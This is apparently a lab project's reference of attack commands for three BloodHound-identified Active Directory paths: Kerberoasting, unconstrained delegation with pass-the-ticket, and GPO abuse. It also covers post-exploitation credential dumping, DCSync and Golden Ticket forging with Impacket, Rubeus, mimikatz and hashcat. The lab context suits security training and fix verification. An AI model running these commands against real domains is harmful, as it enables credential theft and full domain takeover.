# Attack Paths — Exploitation Reference

Commands used to manually validate each of the three BloodHound-identified
paths from KALI01. These invoke published, official releases of standard
AD security tools — nothing here is custom exploit code. Get each tool
from its official repo; none are vendored in this project.

| Tool | Official source |
|---|---|
| Impacket | https://github.com/fortra/impacket |
| Rubeus | https://github.com/GhostPack/Rubeus |
| Mimikatz | https://github.com/gentilkiwi/mimikatz |
| SharpGPOAbuse | https://github.com/FSecureLABS/SharpGPOAbuse |
| Hashcat | https://github.com/hashcat/hashcat |

All commands below assume the domain `lab.local`, DC01 at `10.10.10.10`,
and a starting foothold as the low-privileged `lowpriv-user01` (paths 1–2)
or `helpdesk-user04` (path 3), matching `scripts/03-New-LabUsersAndGroups.ps1`.

---

## Path 1 — Kerberoasting `svc-sql`

**BloodHound edge:** `HasSPN` → `MemberOf` (Domain Admins)

1. Request a TGS ticket for the SPN'd service account and extract its
   crackable hash:

   ```bash
   impacket-GetUserSPNs lab.local/lowpriv-user01:'<password>' \
     -dc-ip 10.10.10.10 -request -outputfile svc-sql.hash
   ```

2. Crack the hash offline:

   ```bash
   hashcat -m 13100 svc-sql.hash /usr/share/wordlists/rockyou.txt
   ```

3. Confirm access as `svc-sql` (a Domain Admin):

   ```bash
   impacket-psexec lab.local/svc-sql:'<cracked-password>'@10.10.10.10
   ```

---

## Path 2 — Unconstrained Delegation on WS01

**BloodHound edges:** `AdminTo` → `HasSession` → captured TGT → `MemberOf`

1. From a foothold on WS01 (local admin), monitor for incoming TGTs:

   ```powershell
   Rubeus.exe monitor /interval:5 /nowrap
   ```

2. Trigger `Helpdesk-Admin` to authenticate to WS01 (in this lab, this is
   simulated directly — log Helpdesk-Admin into WS01 — rather than via a
   coercion primitive, to keep the environment self-contained).

3. Once Rubeus captures the TGT, reuse it (pass-the-ticket):

   ```powershell
   Rubeus.exe ptt /ticket:<base64_ticket_from_step_1>
   ```

4. Confirm impersonation:

   ```powershell
   klist
   dir \\dc01.lab.local\C$
   ```

> **Note:** real-world engagements typically pair this with an
> authentication-coercion primitive (e.g. against the print spooler or
> EFS RPC interfaces) to force a privileged account to authenticate on
> demand. That coercion tooling is out of scope for this lab and is not
> included here — see the vendor advisories and public write-ups linked
> from the Rubeus/Impacket repos if you want to study it separately.

---

## Path 3 — GPO Abuse via `Helpdesk` Group

**BloodHound edges:** `MemberOf` → `GenericAll` (on GPO) → `GPLink` → SYSTEM task

1. From a foothold as `helpdesk-user04`, add a SYSTEM-level scheduled task
   to the GPO the group controls:

   ```powershell
   SharpGPOAbuse.exe --AddComputerTask `
     --TaskName "Update" `
     --Author "LAB\helpdesk-user04" `
     --Command "cmd.exe" `
     --Arguments "/c whoami > C:\Windows\Temp\out.txt" `
     --GPOName "Helpdesk-Software-Install"
   ```

2. Force policy refresh on a target workstation (or wait for the normal
   90-minute cycle):

   ```powershell
   gpupdate /force
   ```

3. Confirm the task ran as SYSTEM on WS01/WS02, then use that SYSTEM
   foothold to harvest local secrets and pivot.

---

## Post-Exploitation — Full Domain Compromise

Once Domain Admin rights are held via any path above:

1. Dump credentials cached in LSASS on DC01:

   ```
   mimikatz # privilege::debug
   mimikatz # sekurlsa::logonpasswords
   ```

2. DCSync to pull every account hash in the domain from KALI01:

   ```bash
   impacket-secretsdump lab.local/svc-sql:'<password>'@10.10.10.10
   ```

3. Extract the `krbtgt` hash and forge a Golden Ticket to confirm
   persistent access:

   ```
   mimikatz # lsadump::dcsync /domain:lab.local /user:krbtgt
   ```

   ```bash
   impacket-ticketer -nthash <krbtgt_nthash> -domain-sid <domain_sid> \
     -domain lab.local Administrator
   ```

---

## Verifying a fix

After running `scripts/99-Reset-Lab.ps1`, re-run the BloodHound
collection (`bloodhound/Invoke-Collection.ps1`) and confirm the
corresponding edge (`HasSPN`, the `AllowedToDelegate`/unconstrained
flag, or `GenericAll` on the GPO) no longer appears on the shortest
path to Domain Admins.
